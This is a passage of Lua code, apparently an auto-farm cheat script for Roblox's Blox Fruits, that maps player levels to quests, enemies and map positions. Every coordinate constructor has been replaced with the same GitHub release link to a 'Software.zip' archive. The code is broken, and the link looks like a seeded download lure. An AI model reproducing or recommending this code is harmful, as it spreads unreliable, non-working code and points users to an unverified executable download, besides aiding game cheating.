			LevelQuest = 2
			NameMon = "Desert Officer"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(897.031128, 6.43846416, 4388.97168, -0.804044724, 3.68233266e-08, 0.594568789, 6.97835176e-08, 1, 3.24365246e-08, -0.594568789, 6.75715199e-08, -0.804044724)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1580.03198, 4.61375761, 4366.86426, 0.135744005, -6.44280718e-08, -0.990743816, 4.35738308e-08, 1, -5.90598574e-08, 0.990743816, -3.51534837e-08, 0.135744005)
		elseif MyLevel == 90 or MyLevel <= 99 then 
			Ms = "Snow Bandit [Lv. 90]"
			NaemQuest = "SnowQuest"
			LevelQuest = 1
			NameMon = "Snow Bandits"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1384.14001, 87.272789, -1297.06482, 0.348555952, -2.53947841e-09, -0.937287986, 1.49860568e-08, 1, 2.86358204e-09, 0.937287986, -1.50443711e-08, 0.348555952)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1370.24316, 102.403511, -1411.52905, 0.980274439, -1.12995728e-08, 0.197641045, -9.57343449e-09, 1, 1.04655214e-07, -0.197641045, -1.04482936e-07, 0.980274439)
		elseif MyLevel == 100 or MyLevel <= 119 then 
			Ms = "Snowman [Lv. 100]"
			NaemQuest = "SnowQuest"
			LevelQuest = 2
			NameMon = "Snowman"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1384.14001, 87.272789, -1297.06482, 0.348555952, -2.53947841e-09, -0.937287986, 1.49860568e-08, 1, 2.86358204e-09, 0.937287986, -1.50443711e-08, 0.348555952)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1370.24316, 102.403511, -1411.52905, 0.980274439, -1.12995728e-08, 0.197641045, -9.57343449e-09, 1, 1.04655214e-07, -0.197641045, -1.04482936e-07, 0.980274439)
		elseif MyLevel == 120 or MyLevel <= 149 then 
			Ms = "Chief Petty Officer [Lv. 120]"
			NaemQuest = "MarineQuest2"
			LevelQuest = 1
			NameMon = "Chief Petty Officer"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5035.0835, 28.6520386, 4325.29443, 0.0243340395, -7.08064647e-08, 0.999703884, -6.36926814e-08, 1, 7.23777944e-08, -0.999703884, -6.54350671e-08, 0.0243340395)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4882.8623, 22.6520386, 4255.53516, 0.273695946, -5.40380647e-08, -0.96181643, 4.37720793e-08, 1, -4.37274998e-08, 0.96181643, -3.01326679e-08, 0.273695946)
		elseif MyLevel == 150 or MyLevel <= 174 then 
			Ms = "Sky Bandit [Lv. 150]"
			NaemQuest = "SkyQuest"
			LevelQuest = 1
			NameMon = "Sky Bandit"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4841.83447, 717.669617, -2623.96436, -0.875942111, 5.59710216e-08, -0.482416272, 3.04023082e-08, 1, 6.08195947e-08, 0.482416272, 3.86078725e-08, -0.875942111)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4970.74219, 294.544342, -2890.11353, -0.994874597, -8.61311236e-08, -0.101116329, -9.10836206e-08, 1, 4.43614923e-08, 0.101116329, 5.33441664e-08, -0.994874597)
		elseif MyLevel == 175 or MyLevel <= 249 then 
			Ms = "Dark Master [Lv. 175]"
			NaemQuest = "SkyQuest"
			LevelQuest = 2
			NameMon = "Dark Master"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4841.83447, 717.669617, -2623.96436, -0.875942111, 5.59710216e-08, -0.482416272, 3.04023082e-08, 1, 6.08195947e-08, 0.482416272, 3.86078725e-08, -0.875942111)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5220.58594, 430.693298, -2278.17456, -0.925375521, 1.12086873e-08, 0.379051805, -1.05115507e-08, 1, -5.52320891e-08, -0.379051805, -5.50948407e-08, -0.925375521)
		elseif MyLevel == 250 or MyLevel <= 275 then 
			Ms = "Toga Warrior [Lv. 250]"
			NaemQuest = "ColosseumQuest"
			LevelQuest = 1
			NameMon = "Toga Warrior"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1779.97583, 44.6077499, -2736.35474, 0.984437346, 4.10396339e-08, 0.175734788, -3.62286876e-08, 1, -3.05844168e-08, -0.175734788, 2.3741821e-08, 0.984437346)
		elseif MyLevel == 275 or MyLevel <= 299 then 
			Ms = "Gladiator [Lv. 275]"
			NaemQuest = "ColosseumQuest"
			LevelQuest = 2
			NameMon = "Gladiato"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1274.75903, 58.1895943, -3188.16309, 0.464524001, 6.21005611e-08, 0.885560572, -4.80449414e-09, 1, -6.76054768e-08, -0.885560572, 2.71497012e-08, 0.464524001)
		elseif MyLevel == 300 or MyLevel <= 324 then 
			Ms = "Military Soldier [Lv. 300]"
			NaemQuest = "MagmaQuest"
			LevelQuest = 1
			NameMon = "Military Soldier"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5316.55859, 12.2370615, 8517.2998, 0.588437557, -1.37880001e-08, -0.808542669, -2.10116209e-08, 1, -3.23446478e-08, 0.808542669, 3.60215964e-08, 0.588437557)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5363.01123, 41.5056877, 8548.47266, -0.578253984, -3.29503091e-10, 0.815856814, 9.11209668e-08, 1, 6.498761e-08, -0.815856814, 1.11920997e-07, -0.578253984)
        elseif MyLevel == 325 or MyLevel <= 374 then -- Military Spy
            Ms = "Military Spy [Lv. 325]"
            NaemQuest = "MagmaQuest"
            LevelQuest = 2
            NameMon = "Military Spy"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5316.1157226563, 12.262831687927, 8517.00390625)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5984.0532226563, 82.14656829834, 8753.326171875)
		elseif MyLevel == 375 or MyLevel <= 399 then 
			Ms = "Fishman Warrior [Lv. 375]"
			NaemQuest = "FishmanQuest"
			LevelQuest = 1
			NameMon = "Fishman Warrior"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(61122.5625, 18.4716396, 1568.16504, 0.893533468, 3.95251609e-09, 0.448996574, -2.34327455e-08, 1, 3.78297464e-08, -0.448996574, -4.43233645e-08, 0.893533468)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60946.6094, 48.6735229, 1525.91687, -0.0817126185, 8.90751153e-08, 0.996655822, 2.00889794e-08, 1, -8.77269599e-08, -0.996655822, 1.28533992e-08, -0.0817126185)
		elseif MyLevel == 400 or MyLevel <= 449 then 
			Ms = "Fishman Commando [Lv. 400]"
			NaemQuest = "FishmanQuest"
			LevelQuest = 2
			NameMon = "Fishman Commando"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(61122.5625, 18.4716396, 1568.16504, 0.893533468, 3.95251609e-09, 0.448996574, -2.34327455e-08, 1, 3.78297464e-08, -0.448996574, -4.43233645e-08, 0.893533468)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(61885.5039, 18.4828243, 1504.17896, 0.577502489, 0, -0.816389024, -0, 1.00000012, -0, 0.816389024, 0, 0.577502489)
		elseif MyLevel == 450 or MyLevel <= 474 then 
			Ms = "God's Guard [Lv. 450]"
			NaemQuest = "SkyExp1Quest"
			LevelQuest = 1
			NameMon = "God's Guards"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4721.71436, 845.277161, -1954.20105, -0.999277651, -5.56969759e-09, 0.0380011722, -4.14751478e-09, 1, 3.75035256e-08, -0.0380011722, 3.73188307e-08, -0.999277651)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-4716.95703, 853.089722, -1933.92542, -0.93441087, -6.77488776e-09, -0.356197298, 1.12145182e-08, 1, -4.84390199e-08, 0.356197298, -4.92565206e-08, -0.93441087)
		elseif MyLevel == 475 or MyLevel <= 524 then 
			Ms = "Shanda [Lv. 475]"
			NaemQuest = "SkyExp1Quest"
			LevelQuest = 2
			NameMon = "Shandas"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7863.63672, 5545.49316, -379.826324, 0.362120807, -1.98046344e-08, -0.93213129, 4.05822291e-08, 1, -5.48095125e-09, 0.93213129, -3.58431969e-08, 0.362120807)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7685.12354, 5601.05127, -443.171509, 0.150056243, 1.79768236e-08, -0.988677442, 6.67798661e-09, 1, 1.91962481e-08, 0.988677442, -9.48289181e-09, 0.150056243)
		elseif MyLevel == 525 or MyLevel <= 549 then 
			Ms = "Royal Squad [Lv. 525]"
			NaemQuest = "SkyExp2Quest"
			LevelQuest = 1
			NameMon = "Royal Squad"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7902.66895, 5635.96387, -1411.71802, 0.0504222959, 2.5710392e-08, 0.998727977, 1.12541557e-07, 1, -3.14249675e-08, -0.998727977, 1.13982921e-07, 0.0504222959)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7685.02051, 5606.87842, -1442.729, 0.561947823, 7.69527464e-09, -0.827172697, -4.24974544e-09, 1, 6.41599973e-09, 0.827172697, -9.01838604e-11, 0.561947823)
		elseif MyLevel == 550 or MyLevel <= 624 then 
			Ms = "Royal Soldier [Lv. 550]"
			NaemQuest = "SkyExp2Quest"
			LevelQuest = 2
			NameMon = "Royal Soldier"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7902.66895, 5635.96387, -1411.71802, 0.0504222959, 2.5710392e-08, 0.998727977, 1.12541557e-07, 1, -3.14249675e-08, -0.998727977, 1.13982921e-07, 0.0504222959)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-7864.44775, 5661.94092, -1708.22351, 0.998389959, 2.28686137e-09, -0.0567218624, 1.99431383e-09, 1, 7.54200258e-08, 0.0567218624, -7.54117195e-08, 0.998389959)
		elseif MyLevel == 625 or MyLevel <= 649 then 
			Ms = "Galley Pirate [Lv. 625]"
			NaemQuest = "FountainQuest"
			LevelQuest = 1
			NameMon = "Galley Pirate"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5254.60156, 38.5011406, 4049.69678, -0.0504891425, -3.62066501e-08, -0.998724639, -9.87921389e-09, 1, -3.57534553e-08, 0.998724639, 8.06145284e-09, -0.0504891425)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5595.06982, 41.5013695, 3961.47095, -0.992138803, -2.11610267e-08, -0.125142589, -1.34249509e-08, 1, -6.26613996e-08, 0.125142589, -6.04887518e-08, -0.992138803)
		elseif MyLevel >= 650 then 
			Ms = "Galley Captain [Lv. 650]"
			NaemQuest = "FountainQuest"
			LevelQuest = 2
			NameMon = "Galley Captain"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5254.60156, 38.5011406, 4049.69678, -0.0504891425, -3.62066501e-08, -0.998724639, -9.87921389e-09, 1, -3.57534553e-08, 0.998724639, 8.06145284e-09, -0.0504891425)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5658.5752, 38.5361786, 4928.93506, -0.996873081, 2.12391046e-06, -0.0790185928, 2.16989656e-06, 1, -4.96097414e-07, 0.0790185928, -6.66008248e-07, -0.996873081)
		end
	end
	if NewWorld then
		if MyLevel == 700 or MyLevel <= 724 then 
			Ms = "Raider [Lv. 700]"
			NaemQuest = "Area1Quest"
			LevelQuest = 1
			NameMon = "Raider"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-424.080078, 73.0055847, 1836.91589, 0.253544956, -1.42165932e-08, 0.967323601, -6.00147771e-08, 1, 3.04272909e-08, -0.967323601, -6.5768397e-08, 0.253544956)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-737.026123, 39.1748352, 2392.57959, 0.272128761, 0, -0.962260842, -0, 1, -0, 0.962260842, 0, 0.272128761)
		elseif MyLevel == 725 or MyLevel <= 774 then 
			Ms = "Mercenary [Lv. 725]"
			NaemQuest = "Area1Quest"
			LevelQuest = 2
			NameMon = "Mercenary"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-424.080078, 73.0055847, 1836.91589, 0.253544956, -1.42165932e-08, 0.967323601, -6.00147771e-08, 1, 3.04272909e-08, -0.967323601, -6.5768397e-08, 0.253544956)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-973.731995, 95.8733215, 1836.46936, 0.999135971, 2.02326991e-08, -0.0415605344, -1.90767793e-08, 1, 2.82094952e-08, 0.0415605344, -2.73922804e-08, 0.999135971)
		elseif MyLevel == 775 or MyLevel <= 874 then 
			Ms = "Swan Pirate [Lv. 775]"
			NaemQuest = "Area2Quest"
			LevelQuest = 1
			NameMon = "Swan Pirate"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(632.698608, 73.1055908, 918.666321, -0.0319722369, 8.96074881e-10, -0.999488771, 1.36326533e-10, 1, 8.92172336e-10, 0.999488771, -1.07732087e-10, -0.0319722369)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(970.369446, 142.653198, 1217.3667, 0.162079468, -4.85452638e-08, -0.986777723, 1.03357589e-08, 1, -4.74980872e-08, 0.986777723, -2.50063148e-09, 0.162079468)
		elseif MyLevel == 875 or MyLevel <= 899 then 
			Ms = "Marine Lieutenant [Lv. 875]"
			NaemQuest = "MarineQuest3"
			LevelQuest = 1
			NameMon = "Marine Lieutenant"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2442.65015, 73.0511475, -3219.11523, -0.873540044, 4.2329841e-08, -0.486752301, 5.64383384e-08, 1, -1.43220786e-08, 0.486752301, -3.99823996e-08, -0.873540044)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2913.26367, 73.0011826, -2971.64282, 0.910507619, 0, 0.413492233, 0, 1.00000012, 0, -0.413492233, 0, 0.910507619)
		elseif MyLevel == 900 or MyLevel <= 949 then 
			Ms = "Marine Captain [Lv. 900]"
			NaemQuest = "MarineQuest3"
			LevelQuest = 2
			NameMon = "Marine Captain"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2442.65015, 73.0511475, -3219.11523, -0.873540044, 4.2329841e-08, -0.486752301, 5.64383384e-08, 1, -1.43220786e-08, 0.486752301, -3.99823996e-08, -0.873540044)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1868.67688, 73.0011826, -3321.66333, -0.971402287, 1.06502087e-08, 0.237439692, 3.68856199e-08, 1, 1.06050372e-07, -0.237439692, 1.11775684e-07, -0.971402287)
		elseif MyLevel == 950 or MyLevel <= 974 then 
			Ms = "Zombie [Lv. 950]"
			NaemQuest = "ZombieQuest"
			LevelQuest = 1
			NameMon = "Zombie"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5492.79395, 48.5151672, -793.710571, 0.321800292, -6.24695815e-08, 0.946807742, 4.05616092e-08, 1, 5.21931227e-08, -0.946807742, 2.16082796e-08, 0.321800292)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5634.83838, 126.067039, -697.665039, -0.992770672, 6.77618939e-09, 0.120025545, 1.65461245e-08, 1, 8.04023372e-08, -0.120025545, 8.18070234e-08, -0.992770672)
		elseif MyLevel == 975 or MyLevel <= 999 then 
			Ms = "Vampire [Lv. 975]"
			NaemQuest = "ZombieQuest"
			LevelQuest = 2
			NameMon = "Vampire"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5492.79395, 48.5151672, -793.710571, 0.321800292, -6.24695815e-08, 0.946807742, 4.05616092e-08, 1, 5.21931227e-08, -0.946807742, 2.16082796e-08, 0.321800292)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-6030.32031, 6.4377408, -1313.5564, -0.856965423, 3.9138893e-08, -0.515373945, -1.12178942e-08, 1, 9.45958547e-08, 0.515373945, 8.68467822e-08, -0.856965423)
		elseif MyLevel == 1000 or MyLevel <= 1049 then 
			Ms = "Snow Trooper [Lv. 1000]"
			NaemQuest = "SnowMountainQuest"
			LevelQuest = 1
			NameMon = "Snow Trooper"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(604.964966, 401.457062, -5371.69287, 0.353063971, 1.89520435e-08, -0.935599446, -5.81846002e-08, 1, -1.70033754e-09, 0.935599446, 5.50377841e-08, 0.353063971)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(535.893433, 401.457062, -5329.6958, -0.999524176, 0, 0.0308452044, 0, 1, -0, -0.0308452044, 0, -0.999524176)
		elseif MyLevel == 1050 or MyLevel <= 1099 then 
			Ms = "Winter Warrior [Lv. 1050]"
			NaemQuest = "SnowMountainQuest"
			LevelQuest = 2
			NameMon = "Winter Warrior"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(604.964966, 401.457062, -5371.69287, 0.353063971, 1.89520435e-08, -0.935599446, -5.81846002e-08, 1, -1.70033754e-09, 0.935599446, 5.50377841e-08, 0.353063971)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1223.7417, 454.575226, -5170.02148, 0.473996818, 2.56845354e-08, 0.880526543, -5.62456428e-08, 1, 1.10811016e-09, -0.880526543, -5.00510211e-08, 0.473996818)
		elseif MyLevel == 1100 or MyLevel <= 1124 then 
			Ms = "Lab Subordinate [Lv. 1100]"
			NaemQuest = "IceSideQuest"
			LevelQuest = 1
			NameMon = "Lab Subordinate"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-6060.10693, 15.9868021, -4904.7876, -0.411000341, -5.06538868e-07, 0.91163528, 1.26306062e-07, 1, 6.12581289e-07, -0.91163528, 3.66916197e-07, -0.411000341)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5769.2041, 37.9288292, -4468.38721, -0.569419742, -2.49055017e-08, 0.822046936, -6.96206541e-08, 1, -1.79282633e-08, -0.822046936, -6.74401548e-08, -0.569419742)
		elseif MyLevel == 1125 or MyLevel <= 1174 then 
			Ms = "Horned Warrior [Lv. 1125]"
			NaemQuest = "IceSideQuest"
			LevelQuest = 2
			NameMon = "Horned Warrior"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-6060.10693, 15.9868021, -4904.7876, -0.411000341, -5.06538868e-07, 0.91163528, 1.26306062e-07, 1, 6.12581289e-07, -0.91163528, 3.66916197e-07, -0.411000341)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-6400.85889, 24.7645149, -5818.63574, -0.964845479, 8.65926566e-08, -0.262817472, 3.98261392e-07, 1, -1.13260398e-06, 0.262817472, -1.19745812e-06, -0.964845479)
		elseif MyLevel == 1175 or MyLevel <= 1199 then 
			Ms = "Magma Ninja [Lv. 1175]"
			NaemQuest = "FireSideQuest"
			LevelQuest = 1
			NameMon = "Magma Ninja"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5431.09473, 15.9868021, -5296.53223, 0.831796765, 1.15322464e-07, -0.555080295, -1.10814341e-07, 1, 4.17010995e-08, 0.555080295, 2.68240168e-08, 0.831796765)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5496.65576, 58.6890411, -5929.76855, -0.885073781, 0, -0.465450764, 0, 1.00000012, -0, 0.465450764, 0, -0.885073781)
		elseif MyLevel == 1200 or MyLevel <= 1249 then 
			Ms = "Lava Pirate [Lv. 1200]"
			NaemQuest = "FireSideQuest"
			LevelQuest = 2
			NameMon = "Lava Pirate"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5431.09473, 15.9868021, -5296.53223, 0.831796765, 1.15322464e-07, -0.555080295, -1.10814341e-07, 1, 4.17010995e-08, 0.555080295, 2.68240168e-08, 0.831796765)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-5169.71729, 34.1234779, -4669.73633, -0.196780294, 0, 0.98044765, 0, 1.00000012, -0, -0.98044765, 0, -0.196780294)
		elseif MyLevel == 1250 or MyLevel <= 1274 then 
			Ms = "Ship Deckhand [Lv. 1250]"
			NaemQuest = "ShipQuest1"
			LevelQuest = 1
			NameMon = "Ship Deckhand"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1163.80872, 138.288452, 33058.4258, -0.998580813, 5.49076979e-08, -0.0532564968, 5.57436763e-08, 1, -1.42118655e-08, 0.0532564968, -1.71604082e-08, -0.998580813)
		elseif MyLevel == 1275 or MyLevel <= 1299 then 
			Ms = "Ship Engineer [Lv. 1275]"
			NaemQuest = "ShipQuest1"
			LevelQuest = 2
			NameMon = "Ship Engineer"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(921.30249023438, 125.400390625, 32937.34375)
		elseif MyLevel == 1300 or MyLevel <= 1324 then 
			Ms = "Ship Steward [Lv. 1300]"
			NaemQuest = "ShipQuest2"
			LevelQuest = 1
			NameMon = "Ship Steward"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(917.96057128906, 136.89932250977, 33343.4140625)
		elseif MyLevel == 1325 or MyLevel <= 1349 then 
			Ms = "Ship Officer [Lv. 1325]"
			NaemQuest = "ShipQuest2"
			LevelQuest = 2
			NameMon = "Ship Officer"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(944.44964599609, 181.40081787109, 33278.9453125)
		elseif MyLevel == 1350 or MyLevel <= 1374 then 
			Ms = "Arctic Warrior [Lv. 1350]"
			NaemQuest = "FrostQuest"
			LevelQuest = 1
			NameMon = "Arctic Warrior"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5669.43506, 28.2117786, -6482.60107, 0.888092756, 1.02705066e-07, 0.459664226, -6.20391774e-08, 1, -1.03572376e-07, -0.459664226, 6.34646895e-08, 0.888092756)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5995.07471, 57.3188477, -6183.47314, 0.702747107, -1.53454167e-07, -0.711440146, -1.08168464e-07, 1, -3.22542007e-07, 0.711440146, 3.03620908e-07, 0.702747107)
		elseif MyLevel == 1375 or MyLevel <= 1424 then 
			Ms = "Snow Lurker [Lv. 1375]"
			NaemQuest = "FrostQuest"
			LevelQuest = 2
			NameMon = "Snow Lurker"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5669.43506, 28.2117786, -6482.60107, 0.888092756, 1.02705066e-07, 0.459664226, -6.20391774e-08, 1, -1.03572376e-07, -0.459664226, 6.34646895e-08, 0.888092756)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5518.00684, 60.5559731, -6828.80518, -0.650781393, -3.64292951e-08, 0.759265184, -4.07668654e-09, 1, 4.44854642e-08, -0.759265184, 2.58550248e-08, -0.650781393)
		elseif MyLevel == 1425 or MyLevel <= 1449 then 
			Ms = "Sea Soldier [Lv. 1425]"
			NaemQuest = "ForgottenQuest"
			LevelQuest = 1
			NameMon = "Sea Soldier"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-3052.99097, 236.881363, -10148.1943, -0.997911751, 4.42321983e-08, 0.064591676, 4.90968759e-08, 1, 7.37270085e-08, -0.064591676, 7.67442998e-08, -0.997911751)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-3030.3696289063, 191.13464355469, -9859.7958984375)
		elseif MyLevel >= 1450 then 
			Ms = "Water Fighter [Lv. 1450]"
			NaemQuest = "ForgottenQuest"
			LevelQuest = 2
			NameMon = "Water Fighter"
			CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-3052.99097, 236.881363, -10148.1943, -0.997911751, 4.42321983e-08, 0.064591676, 4.90968759e-08, 1, 7.37270085e-08, -0.064591676, 7.67442998e-08, -0.997911751)
			CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-3436.7727050781, 290.52191162109, -10503.438476563)
		end
	end
	if ThreeWorld then
        if MyLevel >= 1500 and MyLevel <= 1524 then
            Ms = "Pirate Millionaire [Lv. 1500]"
            NaemQuest = "PiratePortQuest"
            LevelQuest = 1
            NameMon = "Pirate Millionaire"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-290.074677, 42.9034653, 5581.58984)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-290.074677, 42.9034653, 5581.58984)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(81.164993286133, 43.755737304688, 5724.7021484375)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(81.164993286133, 43.755737304688, 5724.7021484375)
        elseif MyLevel >= 1525 and MyLevel <= 1574 then
            Ms = "Pistol Billionaire [Lv. 1525]"
            NaemQuest = "PiratePortQuest"
            LevelQuest = 2
            NameMon = "Pistol Billionaire"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-290.074677, 42.9034653, 5581.58984)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-290.074677, 42.9034653, 5581.58984)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(81.164993286133, 43.755737304688, 5724.7021484375)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(81.164993286133, 43.755737304688, 5724.7021484375)
        elseif MyLevel >= 1575 and MyLevel <= 1599 then
            Ms = "Dragon Crew Warrior [Lv. 1575]"
            NaemQuest = "AmazonQuest"
            LevelQuest = 1
